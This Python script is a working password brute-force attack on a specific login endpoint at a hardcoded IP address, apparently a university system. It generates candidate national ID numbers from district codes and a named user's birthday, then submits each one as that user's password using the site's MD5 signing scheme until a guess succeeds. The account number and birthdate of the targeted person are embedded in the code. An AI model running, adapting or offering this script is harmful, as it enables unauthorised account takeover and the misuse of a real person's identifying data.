'''
hhh
'''
from __future__ import print_function
import requests

from hashlib import md5

URL = 'http://202.115.133.186:8080/Common/Handler/UserLogin.ashx'
HEADER = {'User-Agent':
          'Mozilla/5.0 (Linux x86_64) AppleWebKit/537.36 Safari/537.36'}
SIGN = '1452256711806'
USER = '201311010327'
DISTRICTS = [210201, 210202, 210203, 210204, 210211,
             210212, 210213, 210224, 210281, 210282, 210283]
BIRTHDAY = '19950107'


def hex_md5(msg):
    md5obj = md5()
    md5obj.update(msg)
    return md5obj.hexdigest()


def sign_psw(pwd, user=USER, sign=SIGN):
    return hex_md5(user + sign + hex_md5(pwd))


def get_id(s):
    return s+str((1-2*int(s, 13)) % 11).replace('10', 'X')


def generate_ids():
    ids = []
    for district in DISTRICTS:
        head = str(district) + BIRTHDAY
        for i in range(80):
            cid = head+'%02d' % i
            ids.extend(map(get_id, [cid + str(x*2) for x in range(5)]))
    return ids


def do_request(pwd, user=USER, sign=SIGN):
    payload = {'Action': 'Login', 'userName': user,
               'pwd': sign_psw(pwd, user, sign), 'sign': sign}
    res = requests.post(URL, data=payload, headers=HEADER)
    return res.content

if __name__ == '__main__':
    ids = generate_ids()
    for idx, identity in enumerate(ids):
        print('%04d Testing id:%s\t' % (idx, identity), end='')
        if do_request(identity) == '4':
            print('Fail')
        else:
            print('OK')
            exit(0)
